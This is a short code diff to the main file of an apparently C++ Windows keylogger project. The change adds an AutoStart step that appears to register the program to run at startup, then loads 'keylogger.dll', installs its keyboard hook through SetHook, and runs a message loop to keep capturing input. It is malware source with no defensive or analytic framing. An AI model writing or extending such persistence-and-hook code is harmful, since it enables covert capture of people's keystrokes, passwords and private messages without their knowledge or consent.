@@ -5,17 +5,23 @@
 #include "Dispatcher.hpp"
 #include <Windows.h>
 
+#include "AutoStart.hpp"
 
 typedef void(__stdcall *pFunc)(void);
-typedef void(__stdcall *hook)(Dispatcher *);
+typedef bool(__stdcall *hook)(Dispatcher *);
 
 int	main(int ac, char **av)
 {
+	AutoStart start(av[0]);
+	MSG msg;
 	HMODULE hDll = NULL;
 	hook ptrHook = NULL;
 	pFunc ptrFunc = NULL;
 
 	SetLastError(0);
+
+//	start.verifyPath();
+	start.verifyRegister();
 
 	if ((hDll = LoadLibrary("keylogger.dll")) == NULL
 		|| (ptrHook = (hook)GetProcAddress(hDll, "SetHook")) == NULL)
@@ -24,10 +30,11 @@ int	main(int ac, char **av)
 		Sleep(1000);
 		return (1);
 	}
-	ptrHook(new Dispatcher);
 
-	MSG msg;
-	while (GetMessage(&msg, NULL, 0, 0) > 0)
+	if (ptrHook(new Dispatcher) == false)
+		return (1);
+
+	while (GetMessage(&msg, NULL, 0, 0))
 	{
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
